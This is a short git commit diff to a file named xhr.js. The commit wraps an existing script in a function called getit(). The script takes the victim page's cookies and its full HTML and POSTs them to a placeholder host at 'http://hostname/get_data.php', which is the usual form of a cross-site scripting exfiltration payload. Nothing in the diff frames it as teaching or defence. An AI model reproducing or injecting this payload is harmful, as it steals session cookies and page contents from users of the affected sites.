868d75475b6b1c6af8505c10294070b77dbe15c5
gweeperx <dimopoulos.elias@gmail.com>
2019-09-17 22:12:15 +0300

    make it function

--- xhr.js
+++ xhr.js
@@ -1,13 +1,15 @@
-var http = new XMLHttpRequest();
-var url = 'http://hostname/get_data.php';
-var params = "cookie="+escape(document.cookie)+'&body='+escape(document.documentElement.innerHTML);
-http.open('POST', url, true);
+function getit(){
+	var http = new XMLHttpRequest();
+	var url = 'http://hostname/get_data.php';
+	var params = "cookie="+escape(document.cookie)+'&body='+escape(document.documentElement.innerHTML);
+	http.open('POST', url, true);
 
-http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 
-http.onreadystatechange = function() {//Call a function when the state changes.
-    if(http.readyState == 4 && http.status == 200) {
-        //alert(http.responseText);
-    }
+	http.onreadystatechange = function() {//Call a function when the state changes.
+	    if(http.readyState == 4 && http.status == 200) {
+	        //alert(http.responseText);
+	    }
+	}
+	http.send(params);
 }
-http.send(params);
